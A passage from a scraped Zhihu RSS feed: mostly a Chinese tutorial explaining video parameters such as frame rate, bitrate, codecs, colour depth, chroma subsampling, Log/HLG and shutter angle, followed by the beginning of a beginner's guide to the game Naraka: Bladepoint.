​</p>\n<p>其实还有一个最为主要的原因，目前的消费领域的拍摄设备，基本上都是23.98（23.976），真24p的相机或者录像机，往往比较贵。不过就相差这么一点，看不出来什么的。 ​</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>视频的制式根据各国使用的电源频率不同，分为​<b>PAL制和NTSC制。</b> </p>\n<ul>\n<li>前者有中国和德国为代表，电源频率为50Hz，视频的帧率就是25P，50P或者100P；</li>\n<li>后者以美国和日本为代表，电源频率为60Hz，视频的帧率就是30P，60P或者120P。 </li>\n</ul>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-696b202b9e3a0d181d00645de86f7687_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-696b202b9e3a0d181d00645de86f7687_r.jpg\"></figure><p>这就是有的小朋友经常会问到的一个问题，为什么我的相机宣传可以拍摄120帧的视频，为什么菜单设置里只有100P，切换一下制式就好了。</p>\n<blockquote> 这是必须得吐槽一下，索尼的相机，切换个制式还得格式化，搞不懂为什么会有这么奇葩的设定。</blockquote>\n<p>有小朋友又要问了，那我使用N制还是P制？</p>\n<p>其实现在的视频大多是网络使用，不论是N制还是P制，关系不大，选哪个都行，你开心就好，如果你有电视或者广播播放的需求，那还是选择对应的国家，以免后期的麻烦。 ​</p>\n<p>如果你有多个设备，建议还是将拍摄制式统一。 ​</p>\n<p>另外，还有一点得注意，如果你发现拍摄的场景有照明灯光，画面中出现闪烁的情况，建议还是调节成当地的制式，帧率和电源频率匹配时，就可以解决这个问题。 ​</p>\n<p>我们经常说道的慢动作拍摄，其实是一秒钟拍摄更多的画面，比如120帧，然后播放的时候按照正常的帧率播放（24帧），这样本来1s的画面，需要5秒的时间播放，自然就慢了。 ​</p>\n<p>这个过程也就是我们所说的升格。 ​</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396592972767502336\"></a><p class=\"ztext-empty-paragraph\"><br></p>\n<p><b>既然有升格，那么就有降格</b>，相反的，一秒钟记录更少的画面，然后以正常的速度播放，就会有视频加快的感觉，最常见的降格，其实是延时摄影。 ​</p>\n<p>但是更高的帧率和分辨率会导致更大的数据量，在很多基础的相机上，高帧率和高分辨是不可兼得的，需要作出取舍。 </p>\n<p>这也是为什么目前大家对4k/60这个参数情有独钟的原因，在画质和帧率上达到了一个不错的平衡。 ​</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396594818412441600\"></a><p>​</p>\n<h2>为什么我的4K这么差 ，码率</h2>\n<p>一个显而易见的例子，手机拍摄的4k画面，有时候还不如相机拍摄的1080P。 ​</p>\n<p>按理说，4k的画面要比1080P好多很多啊，为什么？ ​</p>\n<p>决定画质的，除了分斌率，还有码率。 ​</p>\n<p>这也就是一些国内的视频网站，所谓的超高清的视频的画面看起来并不那么高清，除了分辨率虚标之外（720P就是超清，1080P就是蓝光，那4K不得起飞了？） </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f7af8c6e67ef3d5012b43501b65e3496_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2888\" data-rawheight=\"1776\" class=\"origin_image zh-lightbox-thumb\" width=\"2888\" data-original=\"https://pic3.zhimg.com/v2-f7af8c6e67ef3d5012b43501b65e3496_r.jpg\"></figure><p> 视频的码率也惨不忍睹（大多数的视频码率在2M-4M之间）。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-595956abb24f4843239b9618fe8cea12_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2410\" data-rawheight=\"1382\" class=\"origin_image zh-lightbox-thumb\" width=\"2410\" data-original=\"https://pic3.zhimg.com/v2-595956abb24f4843239b9618fe8cea12_r.jpg\"></figure><blockquote> B站的码率其实都算良心的了。</blockquote>\n<p>​</p>\n<p>所谓码率，就是一秒钟记录的数据量，数据量越多，画质越好。码率决定了你文件的大小。</p>\n<p>通常手机这种设备的码率厂家已经给你写死了，没有办法调节。 ​</p>\n<p>问题来了。 对于相机这类设备来说，是否需要将码率设为最高。 ​</p>\n<p>答案也不一定，一切都要按需出发。 因为在一定的分辨率下，不断提高码率所带来的画面提升已经肉眼不可见了，文件体积却在不断地增大。 ​</p>\n<p>一个比较实用的做法是，使用你手头的机器，使用不同的码率拍摄一段看起来复杂的画面。 然后正常的进行后期调色，找到一个你分辨不出来画面差异的码率，然后用它就行了。 ​</p>\n<h2>H.265 MP4.编码与封装</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>找一个盒子装起来：封装格式</h3>\n<p>先来说格式封装，这个是大家最常见到的东西，也就是你文件的后缀名。 ​</p>\n<p>常见的格式，有MP4，和MOV，FLV等。 </p>\n<p>本质上你可以把格式理解为一个容器，可以装进去所有关于视频内容，除了帧画面，还有音频甚至字幕。 比如你在网上下载电影来看，很多都是MKV这种格式，可以塞进去多轨音频甚至多轨字幕，这也就是为什么有的电影能够切换声道的原因。</p>\n<p>​</p>\n<h3>存储的方式，编码</h3>\n<p>下来说说编码，编码就是记录画面的方式。 ​</p>\n<p>有两种记录的方式，一个是帧内编码，比如苹果的PRORES。 这种很好理解，就是直接记录每一帧画面，后期电脑直接按顺序播放这些画面就ok了。 优点就是几乎不需要什么算力，播放起来很流畅，缺点就是会占用更大的空间。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5e9c09f2c0bfdd13efb4bf4e85822c05_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-5e9c09f2c0bfdd13efb4bf4e85822c05_r.jpg\"></figure><p>这也就是为什么同样的配置的电脑，往往使用Final cut Pro剪辑要比Adobe Primier 流畅很多的原因，正是因为Final Cut Pro 使用PRORES的编码方式，但本质上，这是一种『以空间换速度』的做法。 ​</p>\n<p>很多小伙伴们用Final Cut剪视频，剪到一半，突然发现硬盘空间没了，就是这个原因。 </p>\n<p>不过可以在剪辑完成后删除这类优化代理渲染文件，来节省空间，不过如果你有大量的素材，那建议还是搞个外置的大容量SSD或者直接连接Nas剪辑，体验会更好。 ​</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396593311218532353\"></a><p>PRORES是一种中间编码，仅用于中间的视频编辑过程，也就是说，最后视频输出还得靠H.264。 </p>\n<p>H.264是一种帧间编码。 </p>\n<p>简单来说，他只记录每帧之间的变化值，然后解码器根据变化来『算出』中间的画面。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-afc5ab4ff8a658414ab61f2ab79ae992_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-afc5ab4ff8a658414ab61f2ab79ae992_r.jpg\"></figure><p>比如我拍摄一个采访视频，嘉宾基本上坐着不动，背景啥的都没有变化，只记录变化的部分，最大的好处文件体积就会小很多，但是解码播放时，却增加了算力的要求。 ​</p>\n<p>H.264应用十分广泛，几乎应用在所有的设备和产品上。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7765a7001ebe1dbc0c315da619829417_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-7765a7001ebe1dbc0c315da619829417_r.jpg\"></figure><p>他的下一代是H.265，更好的体积压缩，更好的画质。 ​</p>\n<p>但是我们目前的播放和处理设备对于H.265的支持都不太好，也就是说，你直接用当前的电脑剪辑H265编码的视频，会卡的惨不忍睹。</p>\n<p>卡了怎么办？除了换电脑之外，买显卡之外，还可以通过剪辑软件生成代理素材来剪辑。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-db47846040c6df5336c3b4dced840bab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-db47846040c6df5336c3b4dced840bab_r.jpg\"></figure><p> 是一种『以时间换性能的做法』。 ​</p>\n<h2>10bit 422—色深与色度采样</h2>\n<p>10bit 422， 8Bit 420这是我们在看相机参数时，经常会看到的一串数值。 他们到底说的是啥？ ​</p>\n<h3>越深越好，色深</h3>\n<p>先说这个10bit ,色深。 如果你经常使用Photoshop，或者一些设计软件。会经常看到#FFB6C1这样的数值，他们称之为色值。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-cddc2294c47565a5794b1818e3259d2f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-cddc2294c47565a5794b1818e3259d2f_r.jpg\"></figure><p> 通常由6位十六进制字符代表，红绿蓝 每种颜色占用两位。 ​</p>\n<p>也就是说，每一种颜色有16*16种变化，这个数值正好的2的8次方，所以我们把这种颜色称为8位色深，也就是8bit。 ​</p>\n<p>很容易计算，8bit色深的颜色一共有256×256×256=16,777,216 种颜色，也就是我们经常说的1600万色。 ​</p>\n<p>虽然看起来也不少了，但是在实际的拍摄体验中，尤其是渐变的场景，后期稍微拉一下，就会遇到色彩断层的问题。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3a31a4c48177e43e8738628c6fa50dfc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic1.zhimg.com/v2-3a31a4c48177e43e8738628c6fa50dfc_r.jpg\"></figure><p>而10bit，最终色彩总量可以达到10亿色，由于颜色增多，色彩的过渡会更加的自然，哪怕最终输出的还是8bit的画面，依旧可以获得很不错的画面。 ​</p>\n<p>​</p>\n<p>​</p>\n<h3>谁还不是为了省钱啊：色度采样</h3>\n<p>​</p>\n<p>为了数字化的记录颜色，人们搞出来了『色彩空间』这样一个模型。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-9d84b3c081572d1558a148294d4a0f5c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic1.zhimg.com/v2-9d84b3c081572d1558a148294d4a0f5c_r.jpg\"></figure><p> 不同的色彩空间有着不同的特点，应用于不同的领域： 我们最为熟悉的RGB，是一种加法色，应用最为广泛，设备显示，图像处理； CMYK，是一种减法色，通常用印刷行业； RGB发光屏幕的加色模式，依赖于光线，CMYK是一种颜色反光的印刷减色模式，依赖于颜料。有<b>所依赖就会有所不足</b>。所以Lab模式诞生，理论上，Lab可以包含所有色彩。 ​</p>\n<p>但是在电视或者数码摄影系统中，我们通常上使用Y'CBCR这种色彩模式。</p>\n<blockquote> 实际上，Y'CBCR不是一种绝对色彩空间，而是YUV压缩和偏移的版本，但是由于Y'CBCR的应用实在是太广泛了，所有大多时候，我们口中所说YUV指的就是Y'CBCR。</blockquote>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1a7b62a75e45b29098b0c53437130dbd_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-1a7b62a75e45b29098b0c53437130dbd_r.jpg\"></figure><p> 其中： </p>\n<p>Y'代表光的浓度，也就是亮度，而且这个值是非线性的。 </p>\n<p>Cb和Cr代表蓝色和红色浓度的偏移量，包含色度和色差信息。 ​</p>\n<p>常见的格式有以下几种,用一个三分比值表示：</p>\n<ul>\n<li>4:4:4</li>\n<li>4:2:2</li>\n<li>4:2:0​</li>\n</ul>\n<p>第一个值，区域的宽度，也就是区域的像素数量，通常上为4； </p>\n<p>第二个值，第一行像素的色度抽样数目； </p>\n<p>第三个值，第二行的色度采样值。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-cb2de30cf8990d5da5bbe1ea9181c730_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic1.zhimg.com/v2-cb2de30cf8990d5da5bbe1ea9181c730_r.jpg\"></figure><p>比如我们来看4:4:4这种格式，区域的宽度为4个像素，第一行抽样的数值为4，第二行也是4，也就是所有的信息都被采集到了。这是一种对于色彩细节保留最好的格式。 ​</p>\n<p>同理，4:2:2和4:2:0的取样情况如下。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-5b18cd70a502658eb8a7a8c13937f39e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-5b18cd70a502658eb8a7a8c13937f39e_r.jpg\"></figure><p> 可以明显看到，4:2:2损失了50%的信息，而4:2:0几乎损失了75%的信息。 ​</p>\n<p>即使如此，损失了50%的4:2:2也被视为<b>高品质的专业视频格式，</b>比如索尼家的微单相机，目前应该只有A7S3和A1支持4:2:2的视频格式，其他的主流机型，目前还停留在4:2:0上。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396593804573499393\"></a><blockquote> 注：<br>在比较图像质量，比值才是重点，你可以把4:4:4称为1:1:1，但是习惯和约定俗成的情况下，取样的总样本范围还是为4，这也就是为什么没人16:10称为8:5的原因，无他，习惯耳。</blockquote>\n<p>​</p>\n<p>可能有小伙伴要问了，为什么要采样呢，搞的这么复杂？ ​</p>\n<p>鲁(niu)迅(dun)又曾经说过——</p>\n<blockquote>人们的很多选择，多半是为了效率（省钱）。</blockquote>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9b267035f50c2c72be95f96d2be65a61_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-9b267035f50c2c72be95f96d2be65a61_r.jpg\"></figure><p> 要使用4:4:4不仅是对于拍摄器材的性能要求极高，存储上，也吃不消。 ​</p>\n<p>还有一个最主要的原因是，眼睛<b>对于微调的色度不太敏感。</b> <b>​</b></p>\n<p>也就是说，Cr和Cb可以用<b>一点点的样本就能进行编码，而且可见的质量损失微乎其微</b>，却节省了大量的数据量。 </p>\n<p>这也就是你即使用保留了25%的色彩信息的4:2:0去拍，实际的观感也没有那么差的原因。 ​</p>\n<p>但是你如果要进行复杂的后期，甚至抠像特效的时候，你就会发现，4:2:0的画面用起来就有点捉襟见肘了，还是得上4:2:2。</p>\n<h2>RAW，Log，Rec709，HLG又是什么</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>RAW，（生）肉</h3>\n<p>玩摄影的朋友，想必对于RAW很熟悉了，记录了传感器采集到的所有的光线的信息。 严格来说，RAW并不是一种图片格式，而是一个数据包。 </p>\n<p>拍的RAW格式的视频，与图片类似（本质上视频就是一张张图片拼接起来嘛）。 ​</p>\n<p><b>拥有的最大的后期空间</b>，但是能够拍摄RAW视频的器材不多，都是比较专业的摄影机，比如RED，ARRI之流，都十分的昂贵，但是有一个例外，就是适马fp，机身小巧，也不算贵，能够拍摄 cinemaDNG序列（也算是一种RAW视频了）。 ​</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396595820192501760\"></a><p>其实所有的拍摄设备，都有RAW的这个过程，为什么不把RAW数据直接给你呢？ ​</p>\n<p>RAW是个数据量杀手，你刚塞进去一张128G的SD卡，还没有一分钟呢，嚯，卡满了。而是对于后期处理也是一个大难题，流程繁琐，并不适合大多数据消费者使用。 ​</p>\n<h3>Log，指数观察世界</h3>\n<p>人眼能看清楚明亮的天空，也能辨别阴影的细节。 这就说明人眼对于光线的感知并不是线性的，这也就是中性灰是18%，而不是50%的原因。 ​</p>\n<p>为了尽量的拟合人眼识光线明暗的特点，人们找到了log这个函数来模拟。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d643b12381600664f5e99ab68600e809_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-d643b12381600664f5e99ab68600e809_r.jpg\"></figure><p> 为的就是记录更多的明暗数据，换句话说，就是把暗部拉上去，把亮度压下来（是不是像极了后期照片时减高光，加阴影的操作？）来让画面有用更高的动态范围。 ​</p>\n<p>不同的厂家有着不同的Log曲线，比如佳能的是C-log，索尼家的是S-log，富士家是F-log，松下的是V-log（注意不是拍的吃饭旅游的那个玩意）。 ​</p>\n<p>即使是同一家厂商，Log曲线也有不同的版本，比如C-log就有1，2，3的区别，在暗部，亮部的捕获表现上都会有细微的差异。</p>\n<p>但是直接观看Log画面，会显得十分的『灰』。 ​</p>\n<p>如何观看正确的色彩呢？这时候LUT就登场了。 基本上所有的厂家都会提供自己log模式的还原Lut，可以很轻易的地官网找到。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-843d22d2e3e74800f3ce30c9d3d006ae_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-843d22d2e3e74800f3ce30c9d3d006ae_r.jpg\"></figure><p> 日常使用Log拍摄时，需要注意以下两个问题： ​</p>\n<p>起跳ISO，比如，索尼的Slog3的起跳ISO是800，如果在打白天，也想使用大光圈拍摄，那么减光镜就是不可或缺的配件； ​</p>\n<p>对于精准曝光要求极高，所以你得上监视器，或者使用直方图，斑马纹来确认你的曝光是否准确，相信我，大多数新手拍Log会在精准曝光上载无数个跟头，一个比较实用的曝光的经验是，<b>在保留画面信息的基础上，尽量向右曝光。</b></p>\n<blockquote>注:<br>有些相机厂商虽然也支持RAW外录和N-log，但是需要你『花钱』升级​固件，比如尼康Z6/7</blockquote>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>Lut：是滤镜吗</h3>\n<p>Lut，即为look up table，直译就是颜色查找表，输入一个值，然后换成另外一个值，从而达到调色的目的。 是不是看起来跟滤镜的作用一样，但实际上原理是相当不同的。 你可以简单理解为，LUT是颜色替换，而滤镜是计算。 ​</p>\n<p>当然，你也可以在网上找到无数的Lut，有兴趣的话，也可以自己做一个。​</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>HLG</h3>\n<p>随着技术的进步，HDR设备开始普及，包括你手头的旗舰手机几乎都开始支持HDR了。 </p>\n<blockquote>关于更多关于HDR的介绍，可以参考我之见的回答。 </blockquote>\n<p><a href=\"https://www.zhihu.com/question/19774840/answer/660920430\" class=\"internal\">HDR 是什么？有哪些具体介绍？</a></p>\n<p> ​</p>\n<p>相机们也可以加入了HDR视频的拍摄能力。 ​</p>\n<p>这里就不得不提HLG标准了，HLG是BBC和NHK联合开发HDR标准，提供了编码宽动态范围（HDR）的能力，也保留了标准动态范围（SDR）的支持，使得他的兼容性很好。</p>\n<p>而且HLG标准并不需要你掏专利费，所以很多厂商也纷纷投入了HLG怀抱，比如索尼，松下，甚至大疆的大多数设备，都可以拍摄HLG视频。由于采用的是相同的标准，即使是不同厂家的设备拍摄的HLG视频，后期在颜色匹配上也比较完美。 ​</p>\n<blockquote> p.s  <br>iPhone12拍摄的HDR视频，标准为杜比视界。实际上iPhone12拍摄的也是HLG视频，只不过加了一层杜比视界的元数据层。</blockquote>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396596932685529088\"></a><p>​</p>\n<p>相对于Log，HLG还有以下两个特点： ​</p>\n<p>画面没有那么灰，颜色显示较为正常，甚至不用处理也可以直出使用； 没有起跳ISO的限制，使用起来比较方便。 ​</p>\n<p>HLG同Log一样，也有HLG1，HLG2，HLG3的区别，在暗部和亮部的保留和取舍上各有倾向。要依据你实际拍摄的画面而定。有空了可以深入探讨这个问题。 ​</p>\n<p>对于日常使用或者新手来讲，HLG明显更加友好。 ​</p>\n<p>​</p>\n<h3>Rec.709，色彩标准</h3>\n<p>​</p>\n<p>这是一个1990年发布的统一色彩标准，色域和sRGB相同。 ​</p>\n<p>这个色域并不大，多数设备拍摄的素材都可以轻松超过，但是一些显示设备或者产品服务，就只支持这个标准，你大于这个标准拍摄的画面，实际播放是没有任何意义的。 ​</p>\n<p>也就是说，为了能在电视上，普通显示器上正确的显示色彩，就得按照Rec.709的规定来。 ​</p>\n<p>但是随着HDR设备的普及，就连B站也开始支持HDR了，Rec.709这个标准貌似不太够用了，于是新的标准也诞生了，BT2020，支持4k，8K，最高120帧的速率，以及12位的深度。 ​</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f0bcc6186be34fd1ebbcab74a95c4c81_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-f0bcc6186be34fd1ebbcab74a95c4c81_r.jpg\"></figure><p>所以你在拍摄Log或者HLG视频时，可以将色域选择为bt2020，这样可以在HDR显示上获得更好的观影体验。</p>\n<h2>快门角度还是速度</h2>\n<p>​</p>\n<p>照相机除了拍照也可以拍视频，电影机也可以拍照，那他们的区别到底是什么？ 其实最明显的一个操作逻辑上的区别，就是快门。 ​</p>\n<blockquote>关于快门的前世今生，可以参考我之前的这篇文章： <a href=\"https://www.zhihu.com/question/36033197/answer/1693671720\" class=\"internal\"><span class=\"invisible\">https://www.</span><span class=\"visible\">zhihu.com/question/3603</span><span class=\"invisible\">3197/answer/1693671720</span><span class=\"ellipsis\"></span></a> ​</blockquote>\n<p>如果你用过Bmpcc，之类的摄影机，在快门参数的调节上，使用的是快门角度。 ​</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396597176085045248\"></a><p class=\"ztext-empty-paragraph\"><br></p>\n<p>这个概念其实来自于电影拍摄，电影为24帧每秒，那每一帧的快门速度就为1/24s。但是人们发现这个速度的动态模糊太大了，导致视频看起来一点都不清晰。 那么如何调节胶片拍摄的时候的快门速度呢？加上一个旋转快门就好了。 ​</p>\n<p>比如这个180°的快门装置，就能遮挡一半的光线，让快门速度来到1/48s。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b2114d86ca73d5272122b3624f4469f1_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"384\" data-rawheight=\"207\" data-thumbnail=\"https://pic2.zhimg.com/v2-b2114d86ca73d5272122b3624f4469f1_b.jpg\" class=\"content_image\" width=\"384\"></figure><p>当然也有45°的快门和270°的快门，做法也比较简单，调节快门板的角度就好了。 ​</p>\n<p>人们发现，180°的时候，在画面锐度和动态模糊间达到了一个完美的平衡，所以，以前的电影机和摄影机基本上都是以180°的快门角度来拍摄视频。 ​</p>\n<p>在摄影机上，设置为180度的快门角度就好了，但是对于普通相机来说，快门速度要按照二倍帧率的倒数来设定：</p>\n<ul>\n<li>24帧，快门速度为1/50s；</li>\n<li>60帧，快门速度为1/120s;</li>\n<li>120帧，快门速度为1/250s</li>\n</ul>\n<p>来达到类似的效果。 ​</p>\n<p>不过当前的相机基本上都提供能自定义拍摄参数的保存，方便你快速切换。 ​</p>\n<p>​</p>\n<h2>不可忽视的限制</h2>\n<p>使用相机或者单反拍视频时，总是存在各种各样的限制。</p>\n<p>这个限制主要是来自于数据量，拍摄高分辨率高帧率的视频，会产生很大热量，散热如果不给力的话，相机就会做录制时长的限制，比如很多相机只能连续录制30分钟的视频，要么就直接给你来一个过热警告。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396597530466013184\"></a><p>另一个是高分辨率高帧率的视频对存储卡的写入速度也提出了要求，而高速卡的价格往往也不便宜。 ​</p>\n<p>而且数据量的增大，会增加相机的运算负担，一些功能在高分辨或者高帧率下就被禁用，比如：</p>\n<p>大部分相机在1080P/120帧的模式下，无法启用人脸/人眼对焦，只能使用最为传统的反差对焦； </p>\n<p>代理视频的录制功能，只能后期通过电脑生成代理视频。 ​</p>\n<h2>是时候按下录制键了</h2>\n<p>无论你使用怎样的设备，无论这个设备的性能如何，最重要的是出去拍。 以上讲的所有知识，都只是为了让你获得一个更加好看的画面，让你的画面更加锐利，减少噪点，但是画面永远不是全部，他只是锦上添花的部分。 ​</p>\n<p>更加重要的是内容和故事。 如何讲好一个故事，才是你应该不断思考的问题。 ​</p>\n<p>​</p>\n<p>你还对那些视频制作的知识感兴趣，或者有哪些你认为不对的地方，可以在评论区里边提出来，我们一起讨论。 ​​</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>以上。 ​</p>\n<a href=\"https://www.zhihu.com/xen/market/remix/paid_column/1339602918698377216\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-9c1c1c4faedff132eec7f5a8e83b4b18_120x160.jpg\" data-image-width=\"200\" data-image-height=\"267\" class=\"internal\">2021 相机推荐与选购：这款相机该不该买？看看硬核摄影科普</a><p>相关阅读：</p>\n<p><a href=\"https://www.zhihu.com/question/439458908/answer/1682895110\" class=\"internal\">哪位大神可以详细讲解下关于相机ISO方面的介绍？</a></p>\n<p><a href=\"https://www.zhihu.com/question/31142439/answer/1711732441\" class=\"internal\">为什么相机光圈F值越大，实际光圈越小，谁发明的，有什么来由吗？</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/305714803\" class=\"internal\">李明殊：李明殊的摄影类回答文章导航</a></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>​</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lihuawei?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">李明殊</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/387948491?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"新手入坑《永劫无间》需要学会什么？","date":"2021-07-09 03:00:13","description":"\n<p>作为半个新手，给新手最大的建议就是——</p>\n<p><b>趁着现在刚开始，快去多玩玩体验体验吧</b></p>\n<p>可以说在<b>“大家都是初学者”</b>的这个起始阶段，对游戏的体验也应该是最友好的，等到后面很多玩家天赋什么的点满了、练度很高了再去玩，游戏体验落差就会很大了。</p>\n<p>在这里展示一下现在的<b>“游戏体验”</b>:</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b3f4a2969baf5e6aa7b8ee90c07b2848_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"因为预购了妖刀姬，所以现在玩的两把也都在用她\" data-watermark=\"watermark\" data-original-src=\"v2-b3f4a2969baf5e6aa7b8ee90c07b2848\" data-watermark-src=\"v2-423977569e9bcc0bbbd69f097c8d2204\" data-private-watermark-src=\"v2-4b7f4a9257e0b5871f449dfa7b743ed0\"></p>\n<p><br></p>\n<hr>\n<p>好下面我也结合之前玩demo版和今天的官网版来讲一下我自己的个人经验，这些经验应该也是个人认为对新手有所帮助的了:</p>\n<p><b>PS：</b>现在的优化比当时的demo版好很多了</p>\n<p>在玩游戏之前，一定要明白这个游戏的本质：</p>\n<p><b>1.FPS？非FPS?</b></p>\n<p>首先来说一下的武器系统，这也是《永劫无间》和现在其他大逃杀游戏最为不同的点之一：在游戏中<b>近战武器</b>也占有相当的比例，而因为是武侠风，游戏的<b>远程武器</b>也多为箭弩铳炮这类的存在（要考虑下坠了）</p>\n<p>所以说这个游戏给很多不太擅长FPS而喜爱格斗类的玩家创造了机会，尤其常规的远程武器（喷火筒这样的除外）在被人近战黏上的时候也是捉襟见肘，所以在<b>单排</b>期间，即便是擅长FPS的玩家建议也是装配<b>一把近战武器一件远程武器</b>为上。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-95a0e3fd2cea9380c8565bc361775ba6_720w.jpg?rss\" data-rawwidth=\"1751\" data-rawheight=\"819\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-95a0e3fd2cea9380c8565bc361775ba6\" data-watermark-src=\"v2-ded1301266f7c32c990fbeb0c8cfc8c0\" data-private-watermark-src=\"v2-e8f8bb6f20e645a126e1f20f63d987a9\"></p>\n<p><b>2.游戏内符文——魂玉</b></p>\n<p>而另一点和其他大逃杀不同的在于这个游戏中有一个内置的魂玉系统，分为<b>属性魂玉</b>（加防加攻等）、<b>特殊魂玉</b>（加速冷却、减少消耗等）、<b>近战武器魂玉</b>（给特定的近战武器加成等）和<b>远程武器魂玉</b>（给特定的远程武器加成等）这四大类。</p>\n<p><img 